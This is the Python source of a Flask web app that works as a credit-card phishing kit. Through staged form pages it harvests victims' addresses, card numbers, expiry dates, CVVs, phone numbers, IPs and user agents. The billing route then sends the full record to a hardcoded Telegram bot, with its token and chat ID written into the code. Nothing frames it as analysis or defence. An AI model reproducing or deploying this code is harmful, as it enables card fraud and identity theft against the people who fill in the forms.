from flask import Flask, render_template, request, session
from flask_sqlalchemy import SQLAlchemy
import requests

app = Flask(__name__)

app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///ccs.db"
app.config["SECRET_KEY"] = "oiuqx09mumuzulyr38mraq3293i0eqa"

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    cc_num = db.Column(db.String)  # Changed to String
    exp_mo = db.Column(db.Integer)
    exp_year = db.Column(db.Integer)
    cvv = db.Column(db.String)  # Changed to String
    country = db.Column(db.String)
    street = db.Column(db.String)
    zip = db.Column(db.String)
    city = db.Column(db.String)
    state = db.Column(db.String)
    ip = db.Column(db.String)
    useragent = db.Column(db.String)
    phone = db.Column(db.String)
    billing = db.Column(db.String)


class Analytics(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    visits = db.Column(db.Integer)

@app.before_request
def before_request():
    if 'visitor_id' not in session:
        visitor = User()  # Create a new user instance
        db.session.add(visitor)
        db.session.commit()
        session['visitor_id'] = visitor.id  # Store only the ID in the session

@app.route('/')
def main():
    return render_template("index.html")

@app.route('/address', methods=["POST"])
def address():
    country = request.form.get("country")
    address = request.form.get("address")
    city = request.form.get("city")
    state = request.form.get("state")
    zip_code = request.form.get("zip")
    
    visitor = User.query.get(session.get('visitor_id'))  # Safely retrieve the visitor object
    if visitor:
        visitor.country = country
        visitor.street = address
        visitor.city = city
        visitor.state = state
        visitor.zip = zip_code
        db.session.commit()
        return render_template("cc.html")
    return "Visitor not found!", 404  # Handle case where visitor does not exist

@app.route('/cc', methods=["POST"])
def cc():
    name = request.form.get("name")
    cc_num = request.form.get("cc_num")
    exp_mo = request.form.get("exp_mo")
    exp_year = request.form.get("exp_year")
    cvv = request.form.get("cvv")
    user_ip = request.remote_addr
    user_agent = request.user_agent.string
    visitor = User.query.get(session.get('visitor_id'))  # Safely retrieve the visitor object
    if visitor:
        visitor.cc_num = cc_num
        visitor.exp_mo = exp_mo
        visitor.exp_year = exp_year
        visitor.cvv = cvv
        visitor.ip = user_ip
        visitor.useragent = user_agent
        visitor.name = name
        
        db.session.commit()
        return render_template('billing.html')
    return "Visitor not found!", 404


@app.route('/billing', methods=["POST"])
def billing():
    country = request.form.get("country")
    address = request.form.get("address")
    address2 = request.form.get("address2")
    city = request.form.get("city")
    state = request.form.get("state")
    zip = request.form.get("zip")
    phone_number = request.form.get("phone_number")
    visitor = User.query.get(session.get('visitor_id'))
    if visitor:
        visitor.phone = phone_number
        visitor.billing = f"{country}|{address}|{address2}|{city}|{state}|{zip}"
        db.session.commit()
        url = f'https://api.telegram.org/bot7732766751:AAEvrsVWJTZljLCwwSlIryQZoFCbJHf7F34/sendMessage'
        userdata = f"{visitor.name}|{visitor.cc_num}|{visitor.exp_mo}|{visitor.exp_year}|{visitor.cvv}|{visitor.country}|{visitor.street}|{visitor.zip}|{visitor.city}|{visitor.state}|{visitor.ip}|{visitor.useragent}|{visitor.phone}, BILLING: {visitor.billing}"
        params = {
            'chat_id': 7630857822,
            'text': userdata
        }
        requests.post(url, params=params)

        return render_template('thanks.html')
if __name__ == "__main__":
    with app.app_context():
        db.create_all()  # Create the database tables if they don't exist
    app.run(debug=True, host="0.0.0.0")
